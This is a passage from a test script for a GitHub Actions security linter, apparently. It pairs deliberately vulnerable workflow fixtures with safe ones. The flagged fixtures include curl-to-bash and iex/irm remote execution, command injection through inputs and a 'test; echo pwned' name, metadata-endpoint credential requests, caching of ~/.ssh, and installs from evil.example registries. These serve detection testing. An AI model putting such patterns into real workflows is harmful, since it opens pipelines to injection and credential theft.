            const { execSync } = require('child_process');
            const cmd = core.getInput('payload');
            execSync(cmd, { shell: true });
EOF

assert_clean "check 40 accepts github-script without command execution" "40" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          script: |
            const payload = core.getInput('payload');
            console.log(payload);
EOF

# --- Check 41: Inline interpreter command execution APIs ---

assert_detects "check 41 flags python subprocess shell execution" "41" "shell/process execution APIs" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_CMD: ${{ inputs.payload }}
        run: python -c "import os, subprocess; subprocess.run(os.environ['USER_CMD'], shell=True, check=True)"
EOF

assert_clean "check 41 accepts inline interpreter without shell execution" "41" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_CMD: ${{ inputs.payload }}
        run: python -c "import os; print(os.environ['USER_CMD'])"
EOF

# --- Check 42: Shell command execution from variables ---

assert_detects "check 42 flags bash -c executing variable contents" "42" "executed from a variable" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_CMD: ${{ inputs.payload }}
        run: bash -c "$USER_CMD"
EOF

assert_clean "check 42 accepts shell variable treated as data" "42" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_CMD: ${{ inputs.payload }}
        run: printf '%s\n' "$USER_CMD"
EOF

# --- Check 43: Remote script execution variants beyond pipes ---

assert_detects "check 43 flags bash process substitution from curl" "43" "Remote content is executed directly" <<'EOF'
name: test
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: bash <(curl -sSL https://example.com/install.sh)
EOF

assert_detects "check 43 flags PowerShell iex irm pattern" "43" "Remote content is executed directly" <<'EOF'
name: test
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: windows-latest
    steps:
      - run: pwsh -Command "iex (irm https://example.com/install.ps1)"
EOF

assert_clean "check 43 accepts download then verify pattern" "43" <<'EOF'
name: test
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -sSL -o install.sh https://example.com/install.sh
          sha256sum -c <<< "expected_hash  install.sh"
          bash install.sh
EOF

# --- Check 44: Attacker-controlled env vars written to GITHUB_ENV/PATH/OUTPUT ---

assert_detects "check 44 flags attacker-controlled env var written to GITHUB_PATH" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      extra-path:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          EXTRA_PATH: ${{ inputs.extra-path }}
        run: echo "$EXTRA_PATH" >> "$GITHUB_PATH"
EOF

assert_detects "check 44 flags attacker-controlled env var written to GITHUB_STATE" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set state
        env:
          VAL: ${{ github.event.pull_request.title }}
        run: echo "flag=${VAL}" >> "${GITHUB_STATE}"
EOF

assert_clean "check 44 accepts validated path before GITHUB_PATH write" "44" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      extra-path:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          EXTRA_PATH: ${{ inputs.extra-path }}
        run: |
          [[ "$EXTRA_PATH" == /opt/tools/* ]] || exit 1
          printf '%s\n' "/opt/tools/bin" >> "$GITHUB_PATH"
EOF

assert_detects "check 44 flags env var written to GITHUB_PATH with single-line on: workflow_dispatch" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          EXTRA_PATH: ${{ inputs.extra-path }}
        run: echo "$EXTRA_PATH" >> "$GITHUB_PATH"
EOF

# --- Check 45: Expression injection in 'if:' conditions ---

assert_detects "check 45 flags if condition with event data" "45" "if:' condition contains" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Conditional step
        if: contains('${{ github.event.pull_request.title }}', 'build')
        run: echo "This step runs conditionally"
EOF

assert_clean "check 45 accepts safe if condition" "45" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Safe conditional
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        if: contains(env.PR_TITLE, 'build')
        run: echo "This step runs conditionally"
EOF

assert_detects "check 45 flags if condition with inputs on single-line on: workflow_dispatch" "45" "if:' condition contains" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Conditional step
        if: contains('${{ inputs.deploy-target }}', 'prod')
        run: echo "deploying"
EOF

# --- Check 46: Bracket notation bypass in expressions ---

assert_detects "check 46 flags bracket notation in run block" "46" "bracket notation" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Bracket notation
        run: echo "${{ inputs['user-command'] }}"
EOF

assert_detects "check 46 flags bracket notation for github.event" "46" "bracket notation" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Bracket notation event
        run: echo "${{ github.event['pull_request']['title'] }}"
EOF

assert_clean "check 46 accepts bracket notation via env var" "46" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Safe bracket notation
        env:
          USER_CMD: ${{ inputs['user-command'] }}
        run: echo "$USER_CMD"
EOF

# --- Check 47: Additional attacker-controlled event contexts ---

assert_detects "check 47 flags release body in run block" "47" "additional attacker-controlled github.event" <<'EOF'
name: test
on: release
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Release body
        run: echo "${{ github.event.release.body }}"
EOF

assert_detects "check 47 flags workflow_dispatch inputs in run block" "47" "additional attacker-controlled github.event" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      command:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Input command
        run: ${{ github.event.inputs.command }}
EOF

assert_clean "check 47 accepts safe event fields via env" "47" <<'EOF'
name: test
on: release
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Safe release body
        env:
          BODY: ${{ github.event.release.body }}
        run: echo "$BODY"
EOF

# --- Check 48: Export statements with direct interpolation ---

assert_detects "check 48 flags export with input interpolation" "48" "Export statement contains" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      build-dir:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Export build dir
        run: |
          export BUILD_DIR="${{ inputs.build-dir }}"
          cd "$BUILD_DIR" && make
EOF

assert_detects "check 48 flags export with event data" "48" "Export statement contains" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Export PR title
        run: |
          export PR_TITLE="${{ github.event.pull_request.title }}"
          echo "$PR_TITLE"
EOF

assert_clean "check 48 accepts export of env var" "48" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      build-dir:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      BUILD_DIR: ${{ inputs.build-dir }}
    steps:
      - name: Export from env
        run: |
          export DIR="$BUILD_DIR"
          echo "$DIR"
EOF

# --- Check 49: Dynamic 'shell:' property expressions ---

assert_detects "check 49 flags shell property with inputs" "49" "'shell:' property contains" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      custom_shell:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Dynamic shell
        run: echo "hello"
        shell: ${{ inputs.custom_shell }}
EOF

assert_detects "check 49 flags shell property with event data" "49" "'shell:' property contains" <<'EOF'
name: test
on: issue_comment
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Shell from comment
        run: echo "hello"
        shell: ${{ github.event.comment.body }}
EOF

assert_clean "check 49 accepts hardcoded shell" "49" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Hardcoded shell
        run: echo "hello"
        shell: bash
EOF

# --- Check 50: env.* context interpolation in run blocks ---

assert_detects "check 50 flags env interpolation in run block" "50" "Contains \${{ env.* }} directly in run: block" <<'EOF'
name: test
on: push
env:
  MY_VAR: malicious
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Dynamic env
        run: echo "${{ env.MY_VAR }}"
EOF

assert_clean "check 50 accepts env var mapped to shell var" "50" <<'EOF'
name: test
on: push
env:
  MY_VAR: malicious
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Safe env
        run: echo "$MY_VAR"
EOF

# --- Check 51: github.ref/github.ref_name interpolation in run blocks ---

assert_detects "check 51 flags github.ref_name interpolation in run block" "51" "Contains github.ref or github.ref_name interpolation directly in run: block" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Dynamic ref
        run: echo "${{ github.ref_name }}"
EOF

assert_detects "check 51 flags github.ref interpolation in run block" "51" "Contains github.ref or github.ref_name interpolation directly in run: block" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Dynamic ref
        run: echo "${{ github.ref }}"
EOF

assert_clean "check 51 accepts github.ref_name via env block" "51" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Safe ref
        env:
          REF_NAME: ${{ github.ref_name }}
        run: echo "$REF_NAME"
EOF

# --- Check 52: Dynamic environment variable names ---

assert_detects "check 52 flags dynamic env var names" "52" "dynamic environment variable names" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      env_name:
        required: true
      env_value:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      ${{ inputs.env_name }}: ${{ inputs.env_value }}
    steps:
      - run: echo test
EOF

assert_clean "check 52 accepts static env var names" "52" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      env_value:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      MY_STATIC_VAR: ${{ inputs.env_value }}
    steps:
      - run: echo test
EOF

# =============================================================================
# Checks 53-66: New gap checks
# =============================================================================

printf '\n'
printf '%s\n' "--- Checks 53-66: New gap checks ---"

# Check 53: github.actor in run blocks
assert_detects "check 53 flags github.actor in run block" "53" "github.actor/github.triggering_actor" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "PR by ${{ github.actor }}"
EOF

assert_clean "check 53 accepts github.actor via env var" "53" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          ACTOR: ${{ github.actor }}
        run: echo "PR by ${ACTOR}"
EOF

# Check 54: github.event.issue.title in run blocks
assert_detects "check 54 flags issue.title in run block" "54" "github.event.issue.title" << 'EOF'
name: test
on: issues
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}"
EOF

assert_clean "check 54 accepts issue.title via env var" "54" << 'EOF'
name: test
on: issues
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "${TITLE}"
EOF

# Check 55: head.repo.full_name / head.label in run blocks
assert_detects "check 55 flags head.repo.full_name in run block" "55" "head.repo/label" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Fork ${{ github.event.pull_request.head.repo.full_name }}"
EOF

assert_detects "check 55 flags head.label in run block" "55" "head.repo/label" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.head.label }}"
EOF

assert_clean "check 55 accepts head.repo via env var" "55" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          FORK: ${{ github.event.pull_request.head.repo.full_name }}
        run: echo "${FORK}"
EOF

# Check 56: user.login / sender.login in run blocks
assert_detects "check 56 flags review.user.login in run block" "56" "user.login/sender.login" << 'EOF'
name: test
on: pull_request_review
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.review.user.login }}"
EOF

assert_detects "check 56 flags sender.login in run block" "56" "user.login/sender.login" << 'EOF'
name: test
on: issue_comment
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.sender.login }}"
EOF

# Check 57: workflow_run.head_commit.message
assert_detects "check 57 flags workflow_run.head_commit.message in run block" "57" "workflow_run.head_commit" << 'EOF'
name: test
on: workflow_run
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.workflow_run.head_commit.message }}"
EOF

assert_clean "check 57 accepts workflow_run.head_sha (not commit message)" "57" << 'EOF'
name: test
on: workflow_run
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          SHA: ${{ github.event.workflow_run.head_sha }}
        run: echo "${SHA}"
EOF

# Check 58: deployment.payload in run blocks
assert_detects "check 58 flags deployment.payload in run block" "58" "deployment" << 'EOF'
name: test
on: deployment
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.deployment.payload }}"
EOF

# Check 59: discussion.category.name in run blocks
assert_detects "check 59 flags discussion.category.name in run block" "59" "discussion sub-field" << 'EOF'
name: test
on: discussion
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.discussion.category.name }}"
EOF

# Check 60: github.workflow in run blocks
assert_detects "check 60 flags github.workflow in run block" "60" "github.workflow" << 'EOF'
name: "test; echo pwned"
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Workflow ${{ github.workflow }}"
EOF

assert_clean "check 60 accepts github.workflow_ref (different field)" "60" << 'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          WF: ${{ github.workflow }}
        run: echo "${WF}"
EOF

# Check 61: run-name with attacker-controlled expressions
assert_detects "check 61 flags run-name with pull_request.title" "61" "run-name" << 'EOF'
name: test
on: pull_request
run-name: "PR ${{ github.event.pull_request.title }}"
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
EOF

assert_clean "check 61 accepts run-name with safe fields" "61" << 'EOF'
name: test
on: pull_request
run-name: "PR #${{ github.event.pull_request.number }}"
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
EOF

# Check 62: environment with attacker-controlled expressions
assert_detects "check 62 flags environment with head.ref expression" "62" "environment" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ github.event.pull_request.head.ref }}
    steps:
      - run: echo deploy
EOF

assert_clean "check 62 accepts hardcoded environment" "62" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo deploy
EOF

# Check 63: GITHUB_STEP_SUMMARY with attacker-controlled expressions
assert_detects "check 63 flags attacker data written to GITHUB_STEP_SUMMARY" "63" "GITHUB_STEP_SUMMARY" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}" >> "${GITHUB_STEP_SUMMARY}"
EOF

assert_clean "check 63 accepts safe GITHUB_STEP_SUMMARY usage" "63" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "## Build Results" >> "${GITHUB_STEP_SUMMARY}"
EOF

# Check 64: continue-on-error: true
assert_detects "check 64 flags continue-on-error: true" "64" "continue-on-error" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: ./security-check.sh
        continue-on-error: true
      - run: ./deploy.sh
EOF

assert_clean "check 64 accepts continue-on-error: false" "64" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: ./security-check.sh
        continue-on-error: false
      - run: ./deploy.sh
EOF

# Check 65: merge_group.head_commit.message
assert_detects "check 65 flags merge_group.head_commit.message in run block" "65" "merge_group.head_commit" << 'EOF'
name: test
on: merge_group
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.merge_group.head_commit.message }}"
EOF

# Check 66: concurrency group with github.actor
assert_detects "check 66 flags github.actor in concurrency group" "66" "concurrency group" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-${{ github.actor }}
    steps:
      - run: echo test
EOF

assert_clean "check 66 accepts github.sha in concurrency group" "66" << 'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-${{ github.sha }}
    steps:
      - run: echo test
EOF

# =============================================================================
# Checks 67-69: Supply chain, OIDC, and timeout checks
# =============================================================================

printf '\n'
printf '%s\n' "--- Checks 67-69: Supply chain and resource checks ---"

# Check 67: actions/cache with sensitive credential directories
assert_detects "check 67 flags cache with ~/.aws" "67" "sensitive credential directory" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c907fcceea5f9bb3ddf7a8f0ee3e5b7b6f5b9c2
        with:
          path: ~/.aws
          key: aws-creds-${{ runner.os }}
EOF

assert_detects "check 67 flags cache with ~/.kube" "67" "sensitive credential directory" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c907fcceea5f9bb3ddf7a8f0ee3e5b7b6f5b9c2
        with:
          path: ~/.kube
          key: kube-${{ runner.os }}
EOF

assert_detects "check 67 flags cache with ~/.ssh" "67" "sensitive credential directory" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c907fcceea5f9bb3ddf7a8f0ee3e5b7b6f5b9c2
        with:
          path: ~/.ssh
          key: ssh-keys-${{ runner.os }}
EOF

assert_clean "check 67 accepts cache with ~/.npm" "67" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c907fcceea5f9bb3ddf7a8f0ee3e5b7b6f5b9c2
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
EOF

assert_clean "check 67 ignores files without actions/cache" "67" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "~/.aws credentials not used here"
EOF

# Check 68: id-token: write on untrusted triggers
assert_detects "check 68 flags id-token: write on pull_request" "68" "id-token: write permission on untrusted trigger" << 'EOF'
name: test
on: pull_request
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

assert_detects "check 68 flags id-token: write on issue_comment" "68" "id-token: write permission on untrusted trigger" << 'EOF'
name: test
on: issue_comment
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

assert_clean "check 68 accepts id-token: write on push" "68" << 'EOF'
name: test
on: push
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

assert_clean "check 68 accepts id-token: none on pull_request" "68" << 'EOF'
name: test
on: pull_request
permissions:
  id-token: none
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

# Check 69: missing timeout-minutes at job level
assert_detects "check 69 flags missing timeout-minutes" "69" "missing timeout-minutes" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
EOF

assert_clean "check 69 accepts job with timeout-minutes" "69" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - run: make build
EOF

# Check 70: workflow_run trigger with write permissions (confused-deputy)
assert_detects "check 70 flags workflow_run with contents: write" "70" "workflow_run trigger with write permissions" << 'EOF'
name: test
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions:
  contents: write
  pull-requests: write
jobs:
  comment:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

assert_detects "check 70 flags scalar workflow_run with contents: write" "70" "workflow_run trigger with write permissions" << 'EOF'
name: test
on: workflow_run
permissions:
  contents: write
jobs:
  comment:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "hello"
EOF

assert_detects "check 70 flags workflow_run with pull-requests: write only" "70" "workflow_run trigger with write permissions" << 'EOF'
name: test
on:
  workflow_run:
    workflows: ["Deploy"]
    types: [completed]
permissions:
  contents: read
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - run: echo "label PR"
EOF

assert_detects "check 70 flags workflow_run with id-token: write" "70" "workflow_run trigger with write permissions" << 'EOF'
name: test
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - run: echo "deploy"
EOF

assert_clean "check 70 accepts workflow_run with read-only permissions" "70" << 'EOF'
name: test
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions:
  contents: read
  checks: read
jobs:
  report:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo "report"
EOF

assert_clean "check 70 ignores push trigger with write permissions" "70" << 'EOF'
name: test
on: push
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: make
EOF

# Check 71: git config --global safe.directory with wildcard
assert_detects "check 71 flags git config safe.directory '*'" "71" "wildcard disables git" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: git config --global safe.directory '*'
EOF

assert_detects "check 71 flags git config safe.directory * (unquoted)" "71" "wildcard disables git" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: git config --global --add safe.directory *
EOF

assert_clean "check 71 accepts git config safe.directory with specific path" "71" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: git config --global safe.directory /github/workspace
EOF

assert_clean "check 71 accepts git config safe.directory /home/runner/work" "71" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: git config --global --add safe.directory /home/runner/work/repo
EOF

# Check 72: package install from insecure HTTP registry
assert_detects "check 72 flags npm install with http registry" "72" "HTTP (non-HTTPS) registry" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: npm install --registry http://registry.npmjs.org
EOF

assert_detects "check 72 flags pip install with http index-url" "72" "HTTP (non-HTTPS) registry" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install --index-url http://pypi.corp.example.com/simple/ mypackage
EOF

assert_detects "check 72 flags pip install with equals-form http index-url" "72" "Installs packages from an HTTP" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install --index-url=http://pypi.corp.example.com/simple/ mypackage
EOF

assert_detects "check 72 flags pip3 install with -i http://" "72" "HTTP (non-HTTPS) registry" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip3 install -i http://internal.pypi.example.com/simple/ mypackage
EOF

assert_detects "check 72 flags yarn install with http registry" "72" "HTTP (non-HTTPS) registry" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: yarn install --registry http://evil.example
EOF

assert_detects "check 72 flags npm config http registry" "72" "HTTP (non-HTTPS) registry" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: npm config set registry http://evil.example
      - run: npm ci
EOF

assert_clean "check 72 accepts npm install with https registry" "72" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: npm install --registry https://registry.npmjs.org
EOF

assert_clean "check 72 accepts pip install without --index-url" "72" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install requests numpy
EOF

# Check 73: docker run with dangerous flags
assert_detects "check 73 flags docker run --privileged" "73" "dangerous flag" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --privileged ubuntu bash -c "id"
EOF

assert_detects "check 73 flags docker run --network host" "73" "dangerous flag" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --network host ubuntu curl http://169.254.169.254/
EOF

assert_detects "check 73 flags docker run --network=host" "73" "can escape container isolation" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --network=host ubuntu id
EOF

assert_detects "check 73 flags docker run --cap-add SYS_ADMIN" "73" "dangerous flag" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --cap-add SYS_ADMIN ubuntu id
EOF

assert_detects "check 73 flags docker run --cap-add=ALL" "73" "dangerous flag" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --cap-add=ALL ubuntu id
EOF

assert_clean "check 73 accepts docker run without dangerous flags" "73" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run ubuntu bash -c "make test"
EOF

assert_clean "check 73 accepts docker run with benign --cap-add" "73" << 'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --cap-add=NET_BIND_SERVICE ubuntu id
EOF

# --- Check 74: cloud metadata endpoint (IMDS) access ---

assert_detects "check 74 flags curl to AWS IMDS" "74" "IMDS" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
EOF

assert_detects "check 74 flags wget to AWS IMDS" "74" "IMDS" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: wget -qO- http://169.254.169.254/latest/meta-data/hostname
EOF

assert_detects "check 74 flags curl to GCP metadata server" "74" "IMDS" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
EOF

assert_clean "check 74 accepts curl to normal HTTPS endpoint" "74" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -s https://api.example.com/health
EOF

# --- Check 75: hardcoded credentials ---

assert_detects "check 75 flags AWS access key ID" "75" "credential" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
EOF

assert_detects "check 75 flags GitHub PAT (ghp_)" "75" "credential" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: export GITHUB_TOKEN=ghp_abc123def456ghi789jkl012mno345pqr678
EOF

